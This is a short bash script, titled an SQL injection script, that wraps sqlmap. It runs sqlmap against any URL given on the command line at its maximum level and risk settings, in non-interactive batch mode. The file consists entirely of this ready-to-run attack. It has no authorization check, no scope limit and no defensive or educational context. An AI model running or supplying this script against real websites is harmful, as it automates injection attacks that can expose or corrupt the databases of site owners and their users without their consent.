#!/bin/bash

# sql_injection.sh - SQL Injection script

# Function to perform SQL injection
perform_sql_injection() {
    echo "Starting SQL injection on $1..."
    sqlmap -u "$1" --batch --level=5 --risk=3
}

# Check if URL is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <url>"
    exit 1
fi

URL=$1

perform_sql_injection "$URL"
